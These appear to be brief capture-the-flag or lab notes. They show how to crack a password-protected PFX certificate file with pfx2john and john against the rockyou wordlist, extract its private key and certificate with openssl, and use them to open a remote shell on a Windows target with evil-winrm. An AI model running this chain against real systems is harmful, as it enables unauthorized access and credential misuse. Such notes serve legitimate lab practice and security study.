
If password protected then
```bash
pfx2john legacyy_dev_auth.pfx > john.key  
john --wordlist=/usr/share/wordlists/rockyou.txt john.key
```

Getting the public and private keys
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes  
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

Accessing the system
```bash
evil-winrm -S -i $t -c cert.pem -k key.pem
```